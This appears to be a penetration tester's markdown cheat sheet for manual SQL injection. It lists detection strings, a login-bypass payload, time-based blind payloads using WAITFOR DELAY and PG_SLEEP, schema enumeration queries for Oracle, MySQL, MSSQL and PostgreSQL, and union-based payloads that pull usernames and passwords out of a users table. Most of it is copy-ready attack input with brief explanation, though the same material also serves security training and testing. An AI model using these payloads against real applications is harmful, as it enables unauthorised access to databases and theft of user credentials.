# SQL Injections

```default
  _   ___  ___  ___  ___   ___   _ _____ _   ___   _   ___ ___                    _           
 ( ) |   \| _ \/ _ \| _ \ |   \ /_\_   _/_\ | _ ) /_\ / __| __|  _ __ _ _ ___  __| |  ___ ___ 
 |/  | |) |   / (_) |  _/ | |) / _ \| |/ _ \| _ \/ _ \\__ \ _|  | '_ \ '_/ _ \/ _` | |___|___|
     |___/|_|_\\___/|_|   |___/_/ \_\_/_/ \_\___/_/ \_\___/___| | .__/_| \___/\__,_|          
                                                                |_|                           
```

This file is mostly for **manual SQL injections**. 

There should be separate notes for SQLMap somewhere.

## Table of Contents:

* [Detection](./sql_injection.md#detection)
* [Comments](./sql_injection.md#comments)
* [Enumeration](./sql_injection.md#database-software-enum)
* Union-Based
* Error-Based
* Time-Based
* Concat rows

## Detection

When doing manual enum, throw some special characters into a parameter and see if it breaks anything in an unexpected way:

```default
'"(){};
```
```default
'"(){}; -- -#/*
```

But you might also be able to trigger a lot with just a single `'`.

The most basic SQL login bypass:

* user: `' or '1'='1'-- -`
* pass: `' or '1'='1'-- -`


Sometimes you need to escape a function first before you can execute any query:
```default
') <your injection> -- -
```
or
```default
) <your injection> -- -
```

It might requires a bunch of brackets: `'))) <your injection> -- -`


Some SQL injections are blind, they do not return anything visible on the page like added data or an error message. You usually can check those with time based delays.

```default
;WAITFOR DELAY '0:0:5'-- -
);WAITFOR DELAY '0:0:5'-- -
');WAITFOR DELAY '0:0:5'-- -
;SELECT PG_SLEEP(5)--
);SELECT PG_SLEEP(5)--
');SELECT PG_SLEEP(5)--
```

If the server seems to 'freeze' for the given sleep time, then it worked.

## Comments

* MySQL: #, --
* MS SQL: --
* MS Access: %00 (hack!)
* Oracle: --

You often need to get rid of the part of the query that comes after your injection. You can do that by simply commenting out the remainder of the query.

Most often the two minuses work:
```default
--
```

But sometimes it is required that there is a space after the minuses: `-- `. An additional character afterwards ensures the space does not get removed in some strip() or trim() function.

So this is the preferred method that almost always work:
```default
-- -
```

Multi-line comments are also supported sometimes: `/* comment goes here */`. 
Obviously this might not always work because you can only control the comment start `/*`. 
Maybe you can create some funny results through multiple injection points into the same query.

Some engines also support the hash character `#` to initiate a comment.


## Database Software Enum

After gaining basic control, the first thing you want to do is try to find out what you are working with. That will determine the syntax you have to use and where you have to look for interesting data.

### Version

* Oracle : `select banner from v$version-- -`
* Mysql : `select VERSION();` ;alternatively: `SELECT @@version`
* MSSQL : `SELECT @@version`
* PostgreSQL : `SELECT version()`

### Tables

Databases besides Oracle usually support:

```default
SELECT * FROM information_schema.tables
SELECT TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE FROM information_schema.tables
```

The rows of a table work similar:
```default
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
SELECT TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE WHERE table_name = 'Users'
```

Oracle all tables:
```default
SELECT * FROM all_tables
SELECT TABLE_NAME,TABLESPACE_NAME,OWNER FROM all_tables
```

Oracle column names:
```default
SELECT * FROM all_tab_columns
SELECT COLUMN_NAME,DATA_TYPE,TABLE_NAME FROM all_tab_columns WHERE TABLE_NAME='users'
```

### Current User
```default
session_user
current_user
user
user()
```

## Union-based attacks

* When to use:    There is a generated list/table of items generated by an injectible query
* Target result:  Include the rows of another table into the generated list/table (like username, password of a users table)

### Figure out number of selected rows

You can use the `order by` keyword. The query will error out if you order by a number greater than the available rows.

```default
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
... etc.
```

Alternatively you might be able to union select some data constants:

```default
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
... etc.
```

or

```default
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
... etc.
```

The last version might not always work, but the benefit is that you can see where each row ends up in the printed table.

Figure out data type of each row:
```default
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 
```

For integers do the same with some number.

On Oracle you might have to use a table even for constant data values, use the build-in DUAL table then:
```default
' UNION SELECT NULL,NULL FROM DUAL--. 
```

### Example
```default
' union select username,password from users-- -
```


## Concatinate several rows

Maybe you can only control a single row or you have to deal with multi line output, then you need to concat content.

### Oracle:

```default
' union select NULL,username || '~' ||password from users-- -
```

Which selects the rows username and password into one row like 'admin~password123'










